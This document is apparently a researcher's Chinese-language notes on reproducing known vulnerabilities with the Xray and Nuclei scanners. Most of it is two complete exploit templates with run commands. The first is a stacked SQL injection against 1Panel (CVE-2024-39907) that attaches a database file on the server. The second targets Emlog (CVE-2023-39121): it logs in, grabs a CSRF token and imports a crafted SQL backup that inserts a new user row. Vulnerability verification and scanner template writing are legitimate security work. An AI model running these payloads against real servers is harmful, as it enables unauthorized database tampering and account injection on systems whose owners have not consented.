[TOC]



### 复现优先级：

nday:（存在POC细节）

1. 靶场搜索
2. docker搜索
3. 空间搜索
4. 自己搭建

1day:（不存在POC）

1. 找到源码的github，diff一下对应补丁，自己审计

### Xray：

##### 难以实现：

1. r1需要r0的cookie的，不知道怎么提取出来
2. 需要手动set变量的，因为xray不支持set 变量手动输入覆盖

##### 模板：

```
name: poc-cve-2024-39907-direct-sqli
manual: true
transport: http

rules:
  r0:
    request:
      method: POST
      path: /api/v1/hosts/command/search
      headers:
        Content-Type: application/json
        Cookie: "psession=cdbb8ca6-2b00-4718-986a-2968682cf822"
      body: |
        {
          "page": 1,
          "pageSize": 10,
          "groupID": 0,
          "orderBy": "3;ATTACH DATABASE '/tmp/xray_test.db' AS test;CREATE TABLE test.exp(data text);--",
          "order": "ascending",
          "name": "a"
        }
      follow_redirects: false
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"SQL logic error") &&
      response.body.bcontains(b"table exp already exists")

expression: r0()

detail:
  author: cww
  description: 利用已知 psession 值触发 1Panel SQL 注入（CVE-2024-39907）
  links:
    - https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-hvx3-9vg3-63r9
```

```
.\xray_windows_amd64.exe ws --poc .\cve-2024-39907.yaml -u http://192.168.124.132:40389 --json-output result7.json
```

### Nuclei:

##### 细节：

1. 变量可以-var覆盖
2. 下一个请求会默认携带上一个的set-cookie，需要cookie-reuse: true
3. 提取器需要internal: true，不然后面的不能引用

##### 模板：

```
id: CVE-2023-39121

info:
  name: Emlog 2.1.9 - Sql Injection
  author: wjch611
  severity: high
  description: |
    Emlog is an open-source blog system. This vulnerability exists in the data backup/restore functionality where improper input validation allows attackers to execute arbitrary SQL statements through specially crafted backup files.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-39121
    - https://github.com/safe-b/CVE/issues/1#issue-1817133689
  metadata:
    verified: true
    max-request: 5
    vendor: Emlog Official Team
    product: Emlog
    shodan-query:
      - http.title:"emlog"
      - http.title:"emlog"
    fofa-query: title="emlog"
    google-query: intitle:"emlog"
  tags: cve2023,cve,sqli

variables:
  username: admin
  password: admin123

requests:
  - raw:
      - |
        POST /admin/account.php?action=dosignin&s= HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/admin/account.php?action=signin
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Length: 20

        user={{username}}&pw={{password}}
    cookie-reuse: true

  - raw:
      - |
        GET /admin/data.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    extractors:
      - type: regex
        name: token
        part: body
        group: 1
        regex:
          - 'name="token" id="token" value="([a-f0-9]{40})"'
        internal: true

    cookie-reuse: true

  - raw:
      - |
        POST /admin/data.php?action=backup HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 46
        Cache-Control: max-age=0
        Origin: http://{{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/admin/data.php
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        token={{token}}

    extractors:
      - type: dsl
        dsl:
          # 直接获取整个响应体
          - "body"
        name: full_response
        internal: true

    cookie-reuse: true

  - raw:
      - |
        POST /admin/data.php?action=import HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUBHhE8PS934oJ2MP
        Connection: close

        ------WebKitFormBoundaryUBHhE8PS934oJ2MP
        Content-Disposition: form-data; name="token"

        {{token}}
        ------WebKitFormBoundaryUBHhE8PS934oJ2MP
        Content-Disposition: form-data; name="sqlfile"; filename="emlog_test.sql"
        Content-Type: application/octet-stream

        {{full_response}}
        INSERT INTO emlog_user VALUES('111','','$P$BnTaZnToynOoAVP6T/MiTsZc9ZAQNg.',(select user()),'writer','n','',' 1234@qq.com ','','','0','1687261845','1687261845');
        ------WebKitFormBoundaryUBHhE8PS934oJ2MP--

    cookie-reuse: true

  - raw:
      - |
        GET /admin/user.php HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Origin: http://{{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/admin/data.php
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive
    matchers:
      - type: word
        words:
          - "1234@qq.com"  # 直接匹配目标邮箱
        part: body  # 从响应体匹配（默认就是 body，可省略）
```

```
 .\nuclei.exe -t .\CVE-2024-39121.yaml -u http://192.168.124.132 -var username=cww -var password=cww12321 -proxy http://127.0.0.1:8080 --debug
```

### 贡献历史：

https://github.com/projectdiscovery/nuclei-templates/pull/12435
